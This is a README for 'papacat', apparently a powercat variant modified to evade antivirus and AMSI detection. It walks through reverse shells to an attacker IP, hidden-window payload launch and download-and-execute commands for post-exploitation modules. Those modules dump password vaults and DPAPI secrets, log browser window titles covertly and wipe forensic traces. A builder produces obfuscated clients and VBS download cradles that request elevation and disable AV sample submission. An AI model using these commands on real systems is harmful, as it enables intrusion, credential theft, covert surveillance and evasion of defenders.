     powercat - Netcat, The Powershell Version
     Github Repository: https://github.com/besimorhino/powercat
     
     This script attempts to implement the features of netcat in a powershell
     script. It also contains extra features such as built-in relays, execute
     powershell, and a dnscat2 client. 
     
     Redpill papacat version its a modified version of powercat to bypass AV AMS1 detection.
     
     
     Usage: papacat [-c or -l] [-p port] [options]
     -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                     If you are using -dns, specify the DNS Server to send queries to.
            
     -l              Listen Mode. Start a listener on the port specified by -p.
  
     -p  <port>      Port. The port to connect to, or the port to listen on.
  
     -e  <proc>      Execute. Specify the name of the process to start.
  
     -ep             Execute Powershell. Start a pseudo powershell session. You can
                     declare variables and execute commands, but if you try to enter
                     another shell (nslookup, netsh, cmd, etc.) the shell will hang.
            
     -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                     connecting. Default: 60
            
     -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                     established. Used for moving files. You can provide the path to a file,
                     a byte array object, or a string. You can also pipe any of those into
                     papacat, like 'aaaaaa' | papacat -c 10.1.1.1 -p 80
            
     -o  <type>      Output. Specify how papacat should return information to the console.
                     Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
            
     -of <path>      Output File.  Specify the path to a file to write output to.
            
     -d              Disconnect. papacat will disconnect after the connection is established
                     and the input from -i is sent. Used for scanning.
            
     -rep            Repeater. papacat will continually restart after it is disconnected.
                     Used for setting up a persistent server.
                  
     -g              Generate Payload.  Returns a script as a string which will execute the
                     papacat with the options you have specified. -i, -d, and -rep will not
                     be incorporated.
                  
     -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                     can be executed in this way: powershell -E <encoded string>
     -h              Print this help message.
     
     Examples:
     Listen on port 8000 and print the output to the console.
         papacat -l -p 8000 -v
  
     Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
         papacat -c 10.1.1.1 -p 443 -e cmd -v
  
     Send a file to 10.1.1.15 port 8000.
         papacat -c 10.1.1.15 -p 8000 -i C:\inputfile
  
     Write the data sent to the local listener on port 4444 to C:\outfile
         papacat -l -p 4444 -of C:\outfile
  
     Listen on port 8000 and repeatedly server a powershell shell.
         papacat -l -p 8000 -ep -rep -v

<br />

# papacat Manual Execution
Papacat project connects to attacker ip adress [ -c ] through tcp protocol

<br />

#### Download cmdlet
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"
```

<br />

#### handler (listenner)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -l -p 666 -t 120 -v
```

<br />

#### Cmd Client (payload)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -e cmd.exe -p 666 -v
```

#### powershell Client (payload)
```powershell
Import-Module -Name .\papacat.ps1 -Force
papacat -c 192.168.1.72 -ep -p 666 -v
```

<br />

#### powershell Client (payload hidden execution)
```powershell
Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papacat.ps1 -Force;papacat -c 192.168.1.72 -ep -p 666 -v";exit
```

#### powershell Client (payload dropper) -- papacat.bat requires to be manual edited to chance the 'ClientAddr' and 'ClientPort' variables
```powershell
iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e957ba44e77/raw/9bce0e1e1446e4d8ed2a5f3a4af0f30b82272831/papacat.bat" -OutFile "papacat.bat"
```

<br />

![manualpapacat](https://github.com/r00t-3xp10it/redpill/assets/23490060/23bd0050-dc17-491f-acc9-bc10a09e392e)

<br />

# papacat at post-exploitation

#### Send one message to target machine {message-box}
```powershell
powershell (New-Object -ComObject Wscript.Shell).PopUp("BLOCKED ACCESS TO $Env:COMPUTERNAME' RELATED TO PORNOGRAPHIC`n     SURVEYS PERFORMED DURING WORKING HOURS ..",20,"                              * Microsoft Corporation *",0+0)
```

#### Retrieve remote system information
```powershell
systeminfo|Out-File systeminfo.log -force;echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo "";Start-Sleep -Seconds 1;Remove-Item systeminfo.log -force
```

#### Retrieve remote processes running
```powershell
Get-Process|Select-Object Id,ProcessName,Description,StartTime|Where-Object{$_.ProcessName -iNotMatch '(wlanext|svchost|RuntimeBroker|SrTasks)'}|Format-Table -AutoSize
```

#### Stop\Start remote processes
```powershell
# Open porn websites
Start-Process https://youporn.com

# Stop process name (notepad)
Stop-Process -Name "notepad.exe" -Force
```

#### Retrieve remote DNS entrys (resolve hostnames)
```powershell
Get-DnsClientCache|Select-Object Entry,Name,Data|Format-Table -AutoSize;$DnstTable = New-Object System.Data.DataTable;$DnstTable.Columns.Add("RemoteAddress")|Out-Null;$DnstTable.Columns.Add("DnsHostName")|Out-Null;$DnsHostsList = (Get-NetTCPConnection -State ESTABLISHED -EA SilentlyContinue).RemoteAddress;ForEach($TokenItem in $DnsHostsList){$ResolveNames = (Resolve-DnsName $TokenItem -EA SilentlyContinue).NameHost;$DnstTable.Rows.Add("$TokenItem","$ResolveNames")|Out-Null};$DnstTable|Format-Table -AutoSize
```

#### Retrieve active ip address of local lan (ping sweep)
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1" -outfile "PingSweep.ps1";powershell -file PingSweep.ps1 -Action 'Enum'
```
**remark:** <b><i>PingSweep.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 2\3 minuts for module to finish working.

<br />

#### Windows Update Prank ( prank your co-workers -- press F11 on target keyboard to exit prank )
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1";Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
```

#### Do A Barrel Roll Loop Prank ( loop prank 5 times with 17 seconds delay before next loop )
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1";Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 17 -AutoDel on -MsgBoxClose 20"
```

#### Speak a frase to remote host
```powershell
$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       k U khhhr UU  rRr     U  ii          THE END";Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 99;$SpeakObect.Rate = -3;$SpeakObect.Speak($SPEAKME)
```

<br />

#### Spying target webbrowser active tab windows title ( background execution )
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
Start-Process -WindowStyle Hidden powershell -ArgumentList "-file BrowserLogger.ps1 -force 'true' -log"

# Manual stop browserLogger process thats still running in background
$PPID = (Get-Content -Path "Browser.report"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s',''
Stop-Process -Id "$PPID" -Force

# Manual read logfile entrys
Get-Content -Path "Browser.report"

# OR get only the windows title strings
Get-Content -Path "Browser.report"|Select-String -Pattern 'Windows Title   :'

# CleanUp artifacts
Remove-Item BrowserLogger.ps1 -force
Remove-Item Browser.report -force
```

<br />

#### Dump password vault {clear-text}
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"|Unblock-File;powershell -File "Invoke-VaultCmd.ps1" -action "dump" -banner "true" -secure;Remove-Item -Path "Invoke-VaultCmd.ps1" -Force
```

#### Dump password vault DPAPI secrets
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"|Unblock-File;powershell -File "Invoke-VaultCmd.ps1" -action "dpapi" -banner "true" -secure;Remove-Item -Path "Invoke-VaultCmd.ps1" -Force
```
![PassVault](https://github.com/r00t-3xp10it/redpill/assets/23490060/ff4fce40-8a69-4eea-bf61-05ee31754f4c)

<br />

#### Clean remote target artifacts {anti-forensic module}
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1" -OutFile "CleanTracks.ps1";powershell -file CleanTracks.ps1 -CleanTracks Clear -verb true
```
**remark:** <b><i>cleantracks.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 30 seconds for module to finish working.
![w3](https://github.com/r00t-3xp10it/redpill/assets/23490060/061dd192-2b18-4fc4-9077-a58cf086dde3)

---

<br /><br />

# papacat Automation - Obfuscation

[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell ( crandle + payload + handler )<br />and encode\decode tcp data flow if invoked with `-action 'rawcat' -encode 'true'` parameters.<br />
GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)<br />
Encode\Decode tcp data flow: [ired.team/bypassing-ids-signatures-with-simple-reverse-shells](https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells)


<br />

|Parameter Name|Description|Default Value|Optional value|
|---|---|---|---|
|action|creates papacat_client OR obfuscated_client (payload)|obfuscate|rawcat|
|ClientName|Reverse tcp shell name (payload)|revshell|user_input|
|VbsName|Vbscript download\execution crandle name|update|user_input|
|Execute|name of the process to start (parent)|cmd.exe|powershell.exe|
|TimeOut|seconds to wait before giving up on listening|120|from 60 to ...|
|serverPort|Python3 http.server port number|8080|user_input|
|PayloadPort|Reverse tcp shell port number (payload)|666|user_input|
|Force|Disable AV sample submition ( local + remote )|false|true|
|elevate|Make crandle spawn UAC gui to be abble to run crandle\client elevated|false|true|
|Encode|encodes client\server tcp data flow if invoked together with -action 'rawcat'|false|true|

<br />

#### Download cmdlet
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/Builder.ps1" -OutFile "Builder.ps1"
```

#### cmdlet help
```powershell
Get-Help .\Builder.ps1 -full
```

#### execute cmdlet with default values
```powershell
.\Builder.ps1
```

![papacat](https://user-images.githubusercontent.com/23490060/155855813-ff5f7cb3-8156-4e16-8fc7-893e30ced7e6.png)<br />

Encode\Decode tcp data flow between client and server.
```powershell
.\Builder.ps1 -action "rawcat" -encode "true"
```
![yap](https://user-images.githubusercontent.com/23490060/155972413-01f8f574-2f62-404f-9186-bddbd1341c5b.jpg)

<br />

Creates a new obfuscated client (revshell.ps1), disable av samples submition and<br />creates mycat.vbs download crandle that spawn UAC gui to run crandle\client with elevated privs.
```powershell
.\Builder.ps1 -action "obfuscate" -force "true" -VbsName "mycat" -Elevate "true"
```

![up](https://user-images.githubusercontent.com/23490060/156248091-1b64c1bc-cb9d-4fa0-b1fa-9a01235ebae6.png)
<b><i>Remark: crandle.vbs downloads revshell.ps1 from attacker webserver (http.server) to %tmp% and executes revshell.ps1 in background.</i></b>

<br />

#### URLs
https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1<br />
https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells

# Final Notes
Dont Test this on VirusTotal or similar websites ...
